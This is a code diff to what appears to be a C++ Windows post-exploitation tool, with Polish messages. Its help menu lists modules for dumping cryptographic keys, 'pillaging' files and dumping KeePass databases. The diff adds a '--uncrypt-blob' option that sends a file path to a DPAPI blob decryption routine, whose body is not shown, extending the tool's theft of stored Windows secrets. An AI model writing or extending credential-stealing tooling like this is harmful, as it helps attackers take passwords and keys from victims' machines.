@@ -14,6 +14,7 @@
 #include "CryptoKeysDump.h"
 #include "Pillaging.h"
 #include "KeePass.h"
+#include "whatever_dpapi_blob.h"
 #include <psapi.h>
 
 void PrintBanner() {
@@ -52,6 +53,7 @@ void PrintHelp(const char* progName) {
     std::cout << "  --crypto                Dump cryptographic key material\n";
     std::cout << "  --pillaging             General file pillaging\n";
     std::cout << "  --keepass               Dump KeePass databases\n";
+    std::cout << "  --uncrypt-blob <path>   Odszyfruj blob DPAPI z pliku\n";
     std::cout << "  -h, --help              Display this help message\n";
 }
 
@@ -184,6 +186,19 @@ int main(int argc, char* argv[]) {
             else if (arg == "--keepass") {
                 std::cout << "[*] Running KeePass module...\n";
                 KeePass::Run();
+                ranAny = true;
+            }
+            else if (arg == "--uncrypt-blob") {
+                if (i + 1 < argc) {
+                    std::string path = argv[++i];
+                    std::wstring wpath(path.begin(), path.end()); // prosta konwersja
+                    std::cout << "[*] Odszyfrowywanie bloba DPAPI: " << path << "\n";
+                    int ret = WhateverDpapiBlob::DecryptBlobFromFile(wpath);
+                    if (ret != 0)
+                        std::cout << "[-] Nie udało się odszyfrować bloba.\n";
+                } else {
+                    std::cout << "[-] Błąd: --uncrypt-blob wymaga ścieżki do pliku.\n";
+                }
                 ranAny = true;
             }
         }
